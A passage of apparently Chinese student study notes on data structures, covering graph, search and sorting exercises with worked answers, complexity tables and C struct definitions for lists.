)个连通分量,最多有(n )个连通分量</p><p>答：最少就是整体是连通图时，最多就是每个顶点都是孤立的点，那么每个点都是连通分量，注意不可能有0个连通分量，只要有点(哪怕一个)就得是连通分量</p><p>3.N个顶点的无向连通图用邻接矩阵表示时,该矩阵 至少有 2(n-1) 个非零元素。</p><p>答：邻接矩阵非零元素的个数即图的边数之和的2倍(因为无向一条边会被存两次)，图最少有n-1条边，那么矩阵最少有2(n-1)个非零元素</p><p>4.深度优先和广度优先遍历结果均不唯一</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606163156758.png"  alt="image-20200606163156758" style="zoom: 33%;" /><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606163249031.png"  alt="image-20200606163249031" style="zoom:67%;" /><p>5.最小生成树问题</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606170558929.png"  alt="image-20200606170558929"  /><p>若是Kruskal算法即加边，第一次选取最小的一条边即(v1,v4)第二次最小的边是8即图中所示三个边</p><p>若是Prim算法即加点法，从V4开始，v4可到达的点中到达v1最小，然后v1和v4所能到达的其他点中(v1,v3)和(v4,v3)最小，所以答案为(v2,v3)</p><p>6.下图共有3种拓扑排序P</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606201807076.png"  alt="image-20200606201807076" style="zoom: 33%;" /><p>7.判断一个图是否有回路除了用拓扑排序还可以用深度优先遍历（若遍历转一圈回到自身即存在回路）</p><p>8.有向图可拓扑排序的判别条件是____不存在环____(拓扑排序的定义就是对有向无环图定义的)</p><p>9.邻接表示例 ，注意存的是顶点的数组下标，即使有权值也是存下标</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606220207579.png"  alt="image-20200606220207579" style="zoom:67%;" /><p>10最小生成树计算过程(加边不构成回)</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606220547569.png"  alt="image-20200606220547569" style="zoom:50%;" /><p>11.最短路径问题</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606220836613.png"  alt="image-20200606220836613" style="zoom:50%;" /><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606220910729.png"  alt="image-20200606220910729" style="zoom:50%;" /><p>12.AOE网问题</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606223846889.png"  alt="image-20200606223846889"></p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606223938221.png"  alt="image-20200606223938221" style="zoom:80%;" /><p>13.由邻接矩阵写成深度优先和广度优先遍历结果</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200607110925173.png"  alt="image-20200607110925173" style="zoom: 80%;" /><p>深度优先：要求越深越好。第一行1和7有边，然后由7出发，7和3有边，然后由3出发，3和4有边…</p><p>广度优先：要求越广越好。第一行1和7,1和9有边(所以7和9是1的左右孩子)，然后7和9同时出发…</p><p>14.由邻接表写成深度优先和广度优先遍历结果</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200607111541381.png"  alt="image-20200607111541381" style="zoom: 80%;" /><p>广度优先：0出发，0后面有1，2，3。所以遍历结果为0 1 2 3</p><p>深度优先：0出发，0后面第一个为1，由1出发，1后面第一个0访问过了，所以访问2，由2出发。2后面0和1都被访问过了，所以访问3也是 0 1 2 3</p><p>注意深度优先给出邻接表不能画图求，画图比如0后面的1 2 3是没有次序的，先访问哪个都行。但是若给出邻接表那么一定先访问1，所以邻接表求深度优先遍历是唯一的</p><p>虽然这题二者结果相同，但思想不同(越深越好和越广越好)</p><p>15.用DFS遍历一个无环有向图，并在DFS算法退栈返回时打印相应的顶点，则输出的顶点序列是____逆拓扑有序___</p><p>答：比如有A-&gt;B-&gt;C。A先入栈，然后A可到B所以B入栈，B可到C所以C入栈，C没有可达的所以C出栈，然后是BA出栈。而拓扑排序先是A，删除A的出边，B入度为0所以是B，以此类推得到ABC</p><p>这题说的退栈返回打印顶点不是按照深度优先搜索的顺序输出，最先访问的在栈底最后才能弹出</p><p>16.假设一个有n个顶点和e条弧的有向图用邻接表表示，则删除与某个顶点V1相关的所有弧的时间复杂度是（C）</p><p>A.O(n)B.O(e)C.O(n+e)D.O(n*e)</p><p>答：要找到所有指向这个顶点的边，必须得遍历邻接表所有顶点然后遍历每个顶点的边看是否和V1相连，相当于对邻接表遍历，而邻接表遍历深度优先和广度优先都是O(n+e)，注意不是O(n*e)</p><h1 id="cha-zhao">查找</h1><h2 id="zhi-shi-dian-6" id="知识点-v7"><a class="header-anchor" href="#知识点-v7">¶</a>知识点</h2><p>1.线性表的查找（静态查找表）</p><ul><li>顺序查找   （就是最简单的按顺序一个一个比较）<ul><li>算法简单对表结构无要求</li></ul></li><li>折半查找(二分查找)     （要求是顺序存储有序表）<ul><li>data[mid] == k    找到元素，返回下标mid</li><li>data[mid] &gt; k      high=mid-1 (k比中间值小，要向中间值左边继续找)</li><li>data[mid] &lt; k      low=mid+1 (k比中间值大，要向中间值右边继续找)</li><li>助记：就是找到中间值比较待查元素和中间值，再换个中间值再比较</li><li>优点：比较次数少查找效率高，但不适于经常变动</li></ul></li><li>分块查找   块之间有序(左块最大小于右块最小)，块内任意，另建索引表放每块最大关键字<ul><li>适用于既要快速查找又经常动态变化</li></ul></li></ul><p>2.折半查找的判定树：把中间位置的值作为树根，左边和右边的记录作为根的左子树和右子树</p><p>判定树的中序遍历(左根右)得到的是有序的序列(判定树左子树比根节点小，右子树比根节点大)</p><p>3.加入监视哨(存待查元素)    免去每一步查找都要判断是否查找完的情况，只要读到监视哨就说明没查到</p><p>4.树表的查找（动态(可插入删除)查找表）</p><ul><li>二叉排序树（判定树就是二叉排序树，左比根小右比根大）<ul><li>时间复杂度最好为O(log<sub>2</sub><sup>n</sup>),最差退化成O(n)的顺序查找(如都只有1个分支)</li></ul></li><li>平衡二叉树（AVL） 左右子树高度差绝对值不超过1<ul><li>平衡因子：左子树的高度减去右子树的高度只能为0、-1、+1</li><li>由于后人发现树越矮查找效率越高因此发明了AVL，时间复杂度为O(log<sub>2</sub><sup>n</sup>)</li></ul></li><li>B-树       适合外存文件系统索引</li><li>B+树      适合做文件系统的索引</li></ul><p>5.二叉排序树的删除：缺右补左，缺左补右，不缺左(左子树)中(中序)后(最后一个)</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612201608844.png"  alt="image-20200612201608844"></p><p>6.平衡调整：当插入一个结点破坏了平衡性就要调整</p><ul><li>LL型调整</li><li>LR型调整</li><li>RR型调整</li><li>LR型调整</li></ul><p>LL、LR等是对不平衡状态的描述</p><p>若是LL和RR型就把画圈的中间的那个掂起来（想想有重量，另外俩即自己落下去了）</p><p>若是LR和RL型就把画圈的最下面那个掂起来（另外俩也落到它两边）</p><p>若新插入结点在最小不平衡根节点的左(L)孩子的左(L)子树上即为LL型调整</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612205757079.png"  alt="image-20200612205757079" style="zoom:67%;" /><p>若新插入结点在最小不平衡根节点的右®孩子的右左(L)子树上即为RL型调整</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612210339673.png"  alt="image-20200612210339673" style="zoom:67%;" /><p>7.B-树（B树）           m阶B-树，阶数其实就是树的度数  适合外存文件系统索引</p><ul><li>根结点最少有两个分支 （叶子节点除外）</li><li>非终端结点最少有(m/2)<sub>上限</sub>个分支（根节点除外）</li><li>有n个分支的结点有n-1个关键字递增从左到右排列</li><li>叶子结点(失败结点)在同一层可用空指针表示，是查找失败到达的位置</li></ul><p>8.B-树的查找    (类似于二叉树的查找，但是可以有三个或多个方向)</p><p>如查找关键字42。首先在根结点查找，因为42&gt;30，则沿着根结点中指针p[1](下标从0开始)往右下走;因为39&lt;42&lt;45,则沿着子树根结点中指针p[1]往下走，在下层结点中查找关键字42成功，查找结束。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612212801669.png"  alt="image-20200612212801669"></p><p>9.B+树是B-树的变型树，更适合做文件系统的索引。</p><ul><li>叶子结点包含所有关键字从左到右递增且顺序连接</li><li>可从根节点随机查找也可从叶子结点顺序查找  （严格来讲，不算是树了）</li></ul><p>10.散列表：根据给定的关键字计算关键字在表中的地址</p><p>负载(装载因子)：表中结点/表的空间，所以表越满越容易发生冲突</p><p>冲突：不相等的关键字计算出了相同的地址</p><p>同义词：发生冲突的两个关键字</p><p>11.散列表的构造方法</p><ul><li>数字分析法        取关键字的若干位或其组合做哈希地址<ul><li>适用于事先知道关键字集合且关键字位数比散列地址位数多</li></ul></li><li>平方取中法       关键字平方后取中间若干位<ul><li>适用于不了解关键字或难从关键字找到取值较分散的几位</li></ul></li><li>折叠法               分割关键字后将这几部分叠加(舍去进位)<ul><li>适用于散列地址位数少，关键字位数多</li></ul></li><li>除留取余法       取模运算（最常用）</li></ul><p>12.处理冲突的方法</p><ul><li>开放地址法<ul><li>线性探测法        看下一个元素是否为空，当成一个循环表来看  (可能二次聚集)</li><li>二次探测法        原基础加1<sup>2</sup>、-1<sup>2</sup>、2<sup>2</sup>、-2<sup>2</sup>、3<sup>2</sup>…         (可避免二次聚集)</li><li>伪随机探测法    原基础加个伪随机数                                  (可避免二次聚集)</li></ul></li><li>链地址法            相同地址的记录放到同一个单链表中       (可避免二次聚集)</li></ul><h2 id="xi-ti-6" id="习题-v7"><a class="header-anchor" href="#习题-v7">¶</a>习题</h2><p>1.折半查找求判定树</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612154158673.png"  alt="image-20200612154158673">答：先找中间的值，(1+20)/2=10，所以1-9为10的左子树(比根小)，11-20为10的右子树。</p><p>比较时先和10比较，若比10小，则比较1-9，那先和谁比较呢，1-9中的中间值为(1+9)/2=5，所以先和5比较(即5和10相连)。如果还比5小，那就要和1-4比了，同样1-4先和谁比呢，1-4的中间值(1+4)/2=2，所以先和2比较(即2和5相连比5小在左边)，其他依次类推</p><p>查找为4的有1、3、6、8、11、13、16、19(依次和10,15,18,19比较所以4次)</p><p>2.用顺序表和单链表表示的有序表均可使用折半查找方法来提高查找速度。 （错）</p><p>答：单链表无法使用折半查找必须是顺序存储，因为要取中间值</p><p>3.二叉排序树序列判定<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612170421688.png"  alt="image-20200612170421688"></p><p>答：二叉排序树序列可理解为一个元素与二叉排序树比较的记录构成的序列。A中91后面是24说明待查元素X比91小所以后面是24，而24后面是94，说明X比24大，但是24前面已经比较过91了(说明已经肯定比91小了)，现在后面又来了个94显然是错的</p><p>4.<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200612221437829.png"  alt="image-20200612221437828"></p><p>答：装填因子越大就越满越可能发生冲突。冲突少减少不必要的查找。</p><p>不能完全避免聚集(不是同义词却抢相同地址)只能减少但可避免二次聚集</p><p>5.n个元素的表做顺序查找时,若查找每个元素的概率相同，则平均查找长度为_______(n+1)/2______</p><p>答：总查找次数为1+2+3+…+n=n(n+1)/2，则平均查找长度为N/n=(n+1)/2</p><p>6.如果要求一个线性表既能较快的查找，又能适应动态变化的要求，最好采用 （C）</p><p>A.顺序查找           B.折半查找            C.分块查找                  D.哈希查找</p><p>答：分块查找的优点是：在表中插入和删除数据元素时，只要找到该元素对应的块， 就可以在该块内进行插入和删除运算。由于块内是无序的，故插入和删除比较容易，无需进行大量移动。如果线性表既要快速查找又经常动态变化，则可采用分块查找。严版P198</p><p>7.对22个记录的有序表作折半查找，当查找失败时，至少需要比较 ( 4 ) 次关键字。</p><p>答：4层的满二叉树有2<sup>4</sup>-1=15个结点，5层的有31。题目是22个结点，所以是前4层是满二叉树，第五层不是满的，因此最少4次，最多5次。</p><p>8.下面关于 B- 和 B+ 树的叙述中，不正确的是（ C）。</p><p>A． B- 树和 B+ 树都是平衡的多叉树                    B． B- 树和 B+ 树都可用于文件的索引结构</p><p>C． B- 树和 B+ 树都能有效地支持顺序检索        D． B- 树和 B+ 树都能有效地支持随机检索</p><p>答：B+树支持顺序(从最小的关键字叶子起从左到右)，而B-树因为其叶子结点互相没连接只支持从根节点起随机检索</p><p>9.假定对有序表: (3， 4，5，7，24，30，42，54，63，72，87，95) 进行折半查找,<br>①画出描述折半查找过程的判定树;<br>②若查找元素90，需依次与哪些元素比较?<br>③假定每个元素的查找概率相等，求查找成功时的平均查找长度。</p><p>答：:one: 画判定树一般先画出坐标的判定树，再根据坐标填值即可，注意取下界及low和high的变化<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/IMG_20200616_150334.jpg"  alt="IMG_20200616_150334" style="zoom:80%;" /></p><p>:two: 需要与30、63、87、95比较</p><p>:three: 前3层：1+2*2+4*3=17           第四层：5*4=20</p><p>ASL=（17+20）/ 12 = 3.08            即总查找次数除总个数</p><p>10.设哈希函数 H(K) =3 K mod 11 ，哈希地址空间为 0～ 10 ，对关键字序列（ 32， 13 ，49， 24 ， 38， 21 ， 4， 12），按下述两种解决冲突的方法构造哈希表，并分别求出等概率下查找成功时和查找失败时的平均查找长度 ASLsucc 和 ASLunsucc 。<br>① 线性探测法；<br>② 链地址法。</p><p>答：:one: 散列地址就是若算的关键字为空就放里面，不为空就往后找<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616151221999.png"  alt="image-20200616151221861"></p><p>ASLsucc = （ 1+1+1+2+1+2+1+2 ） /8=11/8</p><p>ASLunsucc =（ 1+2+1+8+7+6+5+4+3+2+1 ） /11=40/11</p><blockquote><p>因为最多成功查8个元素，所以查找成功时分母为8，分子就是每个元素查找的次数之和</p><p>而查找失败时可能计算得到的地址有11种，即分母为11，而关键字为空的查一次就知道失败了(要是有也不会为空)，若不为空要往后找直到找到第一个空元素(说明确实没有这个元素不然该放到这个空着的位置了)</p></blockquote><p>:two: 链地址就是要是地址被占了放后面挂着就行</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200616151916346.png"  alt="image-20200616151916346" style="zoom:80%;" /><p>ASLsucc = （ 1*5+2*3 ） /8=11/8        第一列查一次就知道了第二列要查两次</p><p>ASLunsucc =（ 1+2+1+2+3+1+3+1+3+1+1 ） /11=19/11</p><blockquote><p>失败的情况：查一次若为空说明肯定不存在，若不为空继续向下查直到为空说明到底了查找失败(比如第二行需要查两次，第一次查到为4，第二次查到了空，记住不是查一次就行)</p></blockquote><p>总结：查找成功看位置，查找失败就找空</p><p>11.适宜于对动态查找表进行高效率查找的组织结构是 （C）</p><p>A.有序表 B. 分块有序表C. 三叉排序表 D. 线性</p><p>答：如果线性表既要快速查找又要经常动态变化，则可采用分块查找。而这里说的是动态查找表，分块查找属于静态查找表。动态即要进行修改。有序表和线性不适合修改操作</p><h1 id="pai-xu">排序</h1><h2 id="zhi-shi-dian-7" id="知识点-v8"><a class="header-anchor" href="#知识点-v8">¶</a>知识点</h2><p>1.稳定性：排序前和排序后相同关键字的相对位置不发生变化就是稳定的</p><p>若关键字都不重复稳定与否无关紧要，若重复就得具体分析</p><p>2.排序算法的分类                     （以下均是非递减排序的情况）</p><ul><li>插入排序：一个有序的序列，新来的一个插入后仍然有序<ul><li>直接插入排序：第n趟将第n个待排序关键字插入到前面(前n个有序)</li><li>折半插入排序：与直接插入不同的是查找插入位置时用的是折半查找</li><li>希尔排序：对间隔为n的元素排序，缩小间隔直至为1后简单插入排序</li></ul></li><li>交换排序：核心在于交换，比如排高低，每倆换一下后，可能还得换<ul><li>冒泡排序：1号与2号比较然后2号与3号比较…，可确定最大的元素放在最后</li><li>快速排序：选一枢轴，两边指针往中间移(先移右)使得比枢轴小的移到其左边</li></ul></li><li>选择排序：核心是选择，每趟选最大或最小与第一个或最后一个元素交换<ul><li>简单选择排序：第n趟<strong>选择</strong>最小和第n个位置元素<strong>交换</strong></li><li>树形选择(锦标赛)排序：对树如8个选4个最小,4个选倆,2选1,置最小无穷大</li><li>堆排序：调整成堆，根和末尾编号交换输出(每趟得到一个最大值)，重复操作</li></ul></li><li>归并排序：比如每两个归并成一组有序序列，再每两组归并成一大组有序序列</li><li>基数排序：选个位放到对应桶中再选十位放到对应桶中，依次类推</li></ul><p>3.各方法时间空间复杂度和稳定性比较</p><table><thead><tr><th>排序方法</th><th>时间复杂度</th><th>空间复杂度</th><th>稳定性</th></tr></thead><tbody><tr><td>直接插入排序</td><td>O(n<sup>2</sup>)  n比较×n移动</td><td>O(1)  插入排序都为1</td><td>稳定</td></tr><tr><td>折半插入排序</td><td>O(n<sup>2</sup>)  n比较×n移动</td><td>O(1)</td><td>稳定</td></tr><tr><td>希尔排序</td><td><strong>O(n<sup>1.3</sup>)</strong>  研究证明</td><td>O(1)</td><td>不稳定</td></tr><tr><td>冒泡排序</td><td>O(n<sup>2</sup>)</td><td>O(1)</td><td>稳定</td></tr><tr><td>简单选择排序</td><td><strong>O(n<sup>2</sup>)</strong></td><td>O(1)</td><td>不稳定</td></tr><tr><td>锦标赛排序</td><td>O(nlog<sub>2</sub><sup>n</sup>)</td><td><strong>O(n)</strong></td><td>稳定</td></tr><tr><td>快速排序</td><td><strong>O(nlog<sub>2</sub><sup>n</sup>)</strong></td><td><strong>O(log<sub>2</sub><sup>n</sup>)</strong></td><td>不稳定</td></tr><tr><td>堆排序</td><td>O(nlog<sub>2</sub><sup>n</sup>)</td><td>O(1)</td><td>不稳定</td></tr><tr><td>归并排序</td><td>O(nlog<sub>2</sub><sup>n</sup>)</td><td><strong>O(n)</strong></td><td>稳定</td></tr><tr><td>基数排序</td><td><strong>O(d(n+rd))</strong> 每个记录d个关键字</td><td><strong>O(n+rd)</strong>  n个记录</td><td>稳定</td></tr></tbody></table><p>稳定性：希尔快速选择堆不稳，其他都稳</p><p>时间：</p><ul><li><p>除特例外插入和交换类时间都是O(n<sup>2</sup>)，剩下的时间都是O(nlog<sub>2</sub><sup>n</sup>)</p></li><li><p>可记忆为因为简单所以时间长，快速是最快的不可能是O(n<sup>2</sup>)，希尔是最怪的，基数是最长的</p></li></ul><p>空间：</p><ul><li>树形(锦标赛)分叉多或赛道多而归并要一级一级选占空间最多，快速去掉n，基数去掉d</li><li>其他都是O(1)</li></ul><p>4.关键字较少  ，选取简单的：</p><ul><li>直接插入排序    （最简单，性能最佳）</li><li>冒泡排序</li></ul><p>关键字较多，就用先进的：</p><ul><li>关键字较乱，不要求稳定性：快速排序</li><li>关键字基本有序，就用堆排序或归并排序<ul><li>不要求稳定性：堆排序</li><li>要求稳定性：归并排序</li></ul></li></ul><p>关键字多但都较小：基数排序</p><h2 id="xi-ti-7" id="习题-v8"><a class="header-anchor" href="#习题-v8">¶</a>习题</h2><p>1.设待排序的关键字序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}, 试分别写出使用以下排序方法， 每趟排序结束后关键字序列的状态</p><p>①直接插入排序    (第n趟将第n个待排序关键字插入到前面已排序的序列)</p><blockquote><p>原序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>[2] 12 16 30 28 10 16* 20 6 18    第一趟第一个有序</p><p>[2 12] 16 30 28 10 16* 20 6 18    第2个即12与前面的排序<br>[2 12 16] 30 28 10 16* 20 6 18    第3个即16与前面的排序<br>[2 12 16 30] 28 10 16* 20 6 18    前4个有序<br>[2 12 16 28 30] 10 16* 20 6 18    前5个有序<br>[2 10 12 16 28 30] 16* 20 6 18<br>[2 10 12 16 16* 28 30] 20 6 18<br>[2 10 12 16 16* 20 28 30] 6 18<br>[2 6 10 12 16 16* 20 28 30] 18<br>[2 6 10 12 16 16* 18 20 28 30]    最后一个与前面的排序  (查找插入位置是依次比)</p><p>②折半插入排序</p><p>排序过程同①，只不过查找插入位置用的是折半查询</p><p>③希尔排序   (增量选取5,3,1)</p><blockquote><p>原序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>10 2 16 6 18 12 16* 20 30 28 （增量选取 5）第1个和第6个排序，第2和第7…</p><p>6 2 12 10 18 16 16* 20 30 28 （增量选取 3）第1和第4，第2和第5…</p><p>2 6 10 12 16 16* 18 20 28 30 （增量选取 1)   就是直接插入排序</p><p>④冒泡排序     （1号与2号比较然后2号与3号比较…，可确定最大的元素放在最后）</p><blockquote><p>原序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>2 12 16 28 10 16* 20 6 18 [30]    12与2比较交换，12和16比较，16和30比较…<br>2 12 16 10 16* 20 6 18 [28 30]     每一趟确定一个最大的放最后<br>2 12 10 16 16* 6 18 [20 28 30]     第3趟确定3个最大<br>2 10 12 16 6 16* [18 20 28 30]     确定4个最大</p><p>2 10 12 6 16 [16* 18 20 28 30]<br>2 10 6 12 [16 16* 18 20 28 30]<br>2 6 10 [12 16 16* 18 20 28 30]<br>2 6 10 12 16 16* 18 20 28 30]</p><p>⑤快速排序  （选一枢轴，两边指针往中间移使得比枢轴小的移到其左边,先移右指针）</p><blockquote><p>原序列为{12,2,16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p><u>12</u>      [6 2 10] 12 [28 30 16* 20 16 18]   先让右指针往左移<br><u>6</u>        [2] 6 [10] 12 [28 30 16* 20 16 18 ] 一般选第一个为枢轴<br><u>28</u>      2 6 10 12 [18 16 16* 20 ] 28 [30 ]<br><u>18</u>      2 6 10 12 [16* 16] 18 [20] 28 30<br><u>16*</u>    2 6 10 12 16* [16] 18 20 28 30<br><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/IMG_20200618_230219.jpg"  alt="IMG_20200618_230219"></p><p>⑥简单选择排序         （第n趟<strong>选择</strong>最小和第n个位置元素交换）</p><blockquote><p>原序列为{12,2,16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>[2] 12 16 30 28 10 16* 20 6 18    最小的2和第一个12交换<br>[2 6 ]16 30 28 10 16* 20 12 18    最小的6和第二个12交换<br>[2 6 10 ]30 28 16 16* 20 12 18    最小的10和第三个16交换<br>[2 6 10 12] 28 16 16* 20 30 18    最小的12和第四个30交换<br>[2 6 10 12 16] 28 16* 20 30 18<br>[2 6 10 12 16 16* ]28 20 30 18<br>[2 6 10 12 16 16* 18 ]20 30 28<br>[2 6 10 12 16 16* 18 20 ]28 30<br>[2 6 10 12 16 16* 18 20 28] 30</p><p>⑦堆排序</p><blockquote><p>原序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>18 12 16 20 28 10 16* 2 6 [30]        得到最大值30，继续调整交换</p><p>6 20 16 18 12 10 16* 2  [28 30]       得到两个最大值，继续调整交换</p><p>…        由于此题没有答案，下面类似</p><p>建堆(按编号即层次遍历)然后调整堆(从最后面的非叶子结点向前选择最大的放到根，可能不止调整一趟)。</p><p>然后交换根和最后一个编号(注意不是最小)，再重新调整交换重复操作</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/IMG_20200623_154830.jpg"  alt="IMG_20200623_154830"></p><p>⑧二路归并排序   (每两个归并成一组有序序列，再每两组归并成一组有序序列)</p><blockquote><p>原序列为{12,2, 16, 30, 28, 10, 16*, 20, 6, 18}</p></blockquote><p>[2 12]  [16 30]  [10 28]  [16 * 20]  [6 18]     每两个合为一组<br>[2 12 16 30]   [10 16* 20 28]   [6 18]           每两组即四个合为一组<br>[2 10 12 16 16* 20 28 30]   [6 18]                每两组即八个合为一组<br>[2 6 10 12 16 16* 18 20 28 30 ]</p><p>2.树形选择(锦标赛)排序</p><blockquote><p>原序列为{49,38, 65, 97, 76, 13, 27, 49*}</p></blockquote><p>对树8个选4个最小,4个选倆,2选1,选中13为最小输出，置最下面13为无穷大，重复操作</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200619124723912.png"  alt="image-20200619124723912" style="zoom:80%;" /><p>3.基数排序</p><blockquote><p>原序列为{278,109,063,930,589,184,505,269,008,083}</p></blockquote><p>准备10个桶，第一趟收集按个位放到对应桶中</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200619125123102.png"  alt="image-20200619125123102"></p><p>即结果为：930 063 083 184 505 278 008 109 589 269   (个位已经有序)</p><p>第二趟收集按十位放到对应桶中</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200619125230169.png"  alt="image-20200619125230169"></p><p>即结果为：505 008 109 930 063 269 278 083 184 589</p><p>我们可以看到最低2位已经有序了，只需再来一趟收集即可，就不写了</p><p>4.根据结果写排序方法</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200619130413770.png"  alt="image-20200619130413770"></p><p>5.对 n 个不同的排序码进行冒泡排序， 在元素无序的情况下比较的次数最多为( )</p><p>答：比较次数最多时，第一趟比较 n-1 次，第二趟比较 n-2 次, 最后一趟比较 1<br>次，即 (n-1)+(n-2)+…+1= n(n-1)/2</p><p>6.若一组记录的排序码为（ 46, 79 ， 56，38 ， 40，84），则利用快速排序的方法，以第一个记录为基准得到的一次划分结果为（）</p><p>答：左右设两指针，右指针先移，84比46大不移动，40比46小所以40覆盖46的位置，然后该左边的指针移动了，79比46大，所以移到空着的原40的位置。然后该右指针移了，38比46小所以38覆盖空着的原79位置，左边的56比46大移到空着的原38，然后将46放到空着的原56即可。结果为：40,38,46,56,79,84</p><p>7.数据表中有 10000 个元素，如果仅要求求出其中最大的 10 个元素，则采用 (  D  )<br>算法最节省时间</p><p>A．冒泡排序 B ．快速排序 C．简单选择排序 D．堆</p><p>答：堆用大根堆一趟选取一个最大的最快</p><p>冒泡每两个比较，有10000个肯定慢。快速是选枢轴，再左右移动也慢</p><p>简单选择每一趟都几乎快遍历一遍也肯定慢</p><p>8.下列排序算法中， （ A ）不能保证每趟排序至少能将一个元素放到其最终的位置上</p><p>A．希尔排序 B ．快速排序 C. 冒泡排序 D．堆</p><p>答：快速排序的每趟排序能将作为枢轴的元素放到最终位置；冒泡排序的每趟排序能将最大或最小的元素放到最终位置；堆排序的每趟排序能将最大或最小的元素放到最终位置。而希尔排序只是对间隔为n的元素排序所以不确定。</p><blockquote><p>这种让选择哪个排序的需要知道每个排序大致是咋排的就很好选择</p></blockquote><h1 id="ge-lei-xing-cun-chu-jie-gou">各类型存储结构</h1><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200531145418964.png"  alt="image-20200531145418964"></p><h2 id="shun-xu-biao" id="顺序表"><a class="header-anchor" href="#顺序表">¶</a>顺序表</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171311253.png"  alt="image-20200529171311253" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100<span class="comment">//顺序表可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType *elem;<span class="comment">//存储空间的基地址(例如用L.elem[0]取元素)</span></span><br><span class="line">    <span class="keyword">int</span> length;<span class="comment">//当前长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><p>L.elem[i]取值 //L.length-1=&gt;i&gt;=0，如元素为1,2,3，L.length=3，i=0,1,2</p><h2 id="dan-lian-biao" id="单链表"><a class="header-anchor" href="#单链表">¶</a>单链表</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529170625502.png"  alt="image-20200529170658268" style="zoom: 67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//结点的数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span><span class="comment">//结点的指针域，指向下一结点</span></span><br><span class="line">&#125;LNode,*LinkList;<span class="comment">//LinkList为指向结构体LNode的指针类型(相当于LNode *)</span></span><br></pre></td></tr></table></figure><p>若带头结点，空表条件为L-&gt;next==NULL（L为头指针指向头结点永不为空）</p><p>若不带头结点，空表条件为L==NULL</p><h2 id="shuang-xiang-lian-biao" id="双向链表"><a class="header-anchor" href="#双向链表">¶</a>双向链表</h2><img src="/" class="lazyload" 